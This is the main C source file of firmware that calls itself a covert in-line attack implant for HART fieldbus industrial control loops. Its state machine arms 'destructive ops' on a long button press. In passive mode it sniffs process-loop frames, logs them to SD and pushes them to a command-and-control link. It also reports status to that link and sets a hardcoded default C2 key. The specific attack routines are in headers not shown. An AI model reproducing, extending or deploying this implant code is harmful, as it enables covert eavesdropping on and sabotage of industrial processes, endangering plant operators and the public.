/*
 * hart-bleeder — main.c
 * Main application logic and state machine for the
 * HART Fieldbus Covert In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * Build: make
 * Target: STM32G474CEU6 (Cortex-M4 @ 170 MHz)
 *
 * State machine:
 *   BOOT → IDLE → ARMED → (cmd) → ACTIVE → IDLE
 *                       → (button) → PASSIVE_MONITOR → IDLE
 *   IDLE → (auth) → ARMED
 */

#include "board.h"
#include "registers.h"
#include "modem_drv.h"
#include "hart_stack.h"
#include "loop_drv.h"
#include "attacks.h"
#include "console.h"
#include "storage.h"
#include "c2link.h"
#include "oled_drv.h"

/* ── External board init ─────────────────────────────────────── */
extern void board_init_clock(void);
extern void board_init_gpio(void);
extern void board_init_adc(void);
extern void board_init_dac(void);
extern void board_init_systick(void);
extern void board_init_exti(void);
extern void NVIC_SystemReset(void);
extern void console_register_cmds(void);

/* ── Device state ────────────────────────────────────────────── */
typedef enum {
    ST_BOOT = 0,
    ST_IDLE,
    ST_ARMED,
    ST_PASSIVE_MONITOR,
    ST_ACTIVE,
    ST_FAULT,
} dev_state_t;

static dev_state_t s_state = ST_BOOT;
static uint32_t   s_state_ts = 0;
static uint8_t    s_battery_pct = 0;
static uint8_t    s_armed = 0;

/* ── Battery read ────────────────────────────────────────────── */
static uint8_t read_battery_pct(void) {
    /* ADC channel 10 (PB1) via VBAT divider */
    adc_regs_t *a = ADC(1);
    a->CR |= ADC_CR_ADSTART;
    while (!(a->ISR & ADC_ISR_EOC)) { }
    uint16_t raw = (uint16_t)(*(volatile uint32_t *)(ADC1_BASE + 0x40) & 0xFFF);
    float v = ((float)raw / 4095.0f) * 3.3f * 2.0f;   /* divider */
    /* LiPo: 3.0V = 0%, 4.2V = 100% */
    float pct = (v - 3.0f) / 1.2f * 100.0f;
    if (pct < 0) pct = 0;
    if (pct > 100) pct = 100;
    return (uint8_t)pct;
}

/* ── State transitions ───────────────────────────────────────── */
static void enter_state(dev_state_t ns) {
    s_state = ns;
    s_state_ts = system_millis();
    switch (ns) {
    case ST_BOOT:
        break;
    case ST_IDLE:
        gpio_write(GPIO(B), PIN_LED_GREEN, 1);
        gpio_write(GPIO(B), PIN_LED_RED, 0);
        gpio_write(GPIO(B), PIN_LED_BLUE, 0);
        loop_set_mode(LOOP_MODE_PASSIVE);
        break;
    case ST_ARMED:
        gpio_write(GPIO(B), PIN_LED_GREEN, 0);
        gpio_write(GPIO(B), PIN_LED_RED, 1);
        break;
    case ST_PASSIVE_MONITOR:
        gpio_write(GPIO(B), PIN_LED_BLUE, 1);
        loop_set_mode(LOOP_MODE_PASSIVE);
        break;
    case ST_ACTIVE:
        gpio_write(GPIO(B), PIN_LED_RED, 1);
        break;
    case ST_FAULT:
        gpio_write(GPIO(B), PIN_LED_RED, 1);
        gpio_write(GPIO(B), PIN_LED_GREEN, 0);
        gpio_write(GPIO(B), PIN_LED_BLUE, 0);
        break;
    }
}

/* ── Passive monitor task: continuous frame sniffing ─────────── */
static void passive_monitor_task(void) {
    hart_frame_t f;
    if (hart_recv_frame(&f, 50) == 0) {
        /* Log captured frame to SD */
        storage_log_frame(&f, sizeof(f));
        /* Push to C2 if authenticated */
        c2_send_frame(&f, sizeof(f));
        /* Console echo */
        console_printf("[CAP] cmd=%u(%s) addr=%u len=%u %s\r\n",
                       f.cmd, hart_cmd_name(f.cmd), f.addr, f.data_len,
                       f.is_response ? "RSP" : "CMD");
    }
}

/* ── Loop health monitor ─────────────────────────────────────── */
static void loop_health_task(void) {
    static uint32_t last = 0;
    if ((system_millis() - last) < 500) return;
    last = system_millis();

    loop_state_t ls;
    loop_sample(&ls);
    if (ls.fault) {
        console_printf("[FAULT] loop fault=0x%X I=%.2fmA V=%.1fV\r\n",
                       ls.fault, ls.i_ma, ls.v_loop);
        if (s_state == ST_ARMED || s_state == ST_ACTIVE)
            enter_state(ST_FAULT);
    } else if (s_state == ST_FAULT) {
        enter_state(ST_IDLE);
    }

    /* Update OLED status */
    oled_draw_status((uint8_t)loop_get_mode(), s_battery_pct,
                     g_hart.n_devices, ls.i_ma);
}

/* ── Button handler (user button = disarm / cycle mode) ──────── */
static void button_task(void) {
    static uint8_t prev = 1;
    static uint32_t press_ts = 0;
    uint8_t now = gpio_read(GPIO(C), PIN_USER_BUTTON) ? 0 : 1;
    if (now && !prev) {
        press_ts = system_millis();
    }
    if (!now && prev && press_ts) {
        uint32_t dur = system_millis() - press_ts;
        press_ts = 0;
        if (dur < 1000) {
            /* Short press: cycle passive monitor */
            if (s_state == ST_IDLE) {
                enter_state(ST_PASSIVE_MONITOR);
                console_printf("[BTN] passive monitor on\r\n");
            } else if (s_state == ST_PASSIVE_MONITOR) {
                enter_state(ST_IDLE);
                console_printf("[BTN] passive monitor off\r\n");
            }
        } else {
            /* Long press: arm/disarm */
            if (s_state == ST_IDLE) {
                s_armed = 1;
                enter_state(ST_ARMED);
                console_printf("[BTN] ARMED — destructive ops enabled\r\n");
            } else if (s_state == ST_ARMED) {
                s_armed = 0;
                enter_state(ST_IDLE);
                console_printf("[BTN] disarmed\r\n");
            }
        }
    }
    prev = now;
}

/* ── Main ────────────────────────────────────────────────────── */
int main(void) {
    /* Hardware bring-up */
    board_init_clock();
    board_init_gpio();
    board_init_adc();
    board_init_dac();
    board_init_systick();
    board_init_exti();

    enter_state(ST_BOOT);

    /* Peripherals */
    console_init();
    console_register_cmds();
    oled_init();
    loop_init();
    hart_init();
    storage_init();
    c2_init();

    /* Default C2 PSK — operator must override via auth */
    static const uint8_t default_psk[16] =
        { 'j','a','y','i','s','1','-','H','A','R','T','-','B','L','E','D' };
    c2_set_psk(default_psk, 16);

    console_printf("\r\n=== HART-Bleeder — jayis1 ===\r\n");
    console_printf("MCU: %s @ %lu MHz\r\n", BOARD_MCU_NAME,
                   BOARD_MCU_CORE_CLK / 1000000UL);
    console_printf("HART stack ready. Loop mode: PASSIVE\r\n");
    console_printf("Type 'help' for commands.\r\n");

    s_battery_pct = read_battery_pct();
    oled_draw_status(0, s_battery_pct, 0, 0.0f);

    enter_state(ST_IDLE);

    /* Main loop */
    uint32_t batt_last = system_millis();
    while (1) {
        console_task();
        c2_task();
        button_task();
        loop_health_task();

        if (s_state == ST_PASSIVE_MONITOR)
            passive_monitor_task();

        /* Battery update every 30 s */
        if ((system_millis() - batt_last) > 30000) {
            s_battery_pct = read_battery_pct();
            batt_last = system_millis();
            c2_send_status((uint8_t)s_state, s_battery_pct, g_hart.n_devices);
        }

        /* Low-power wait for next interrupt/event */
        __asm volatile("wfi");
    }
    return 0;
}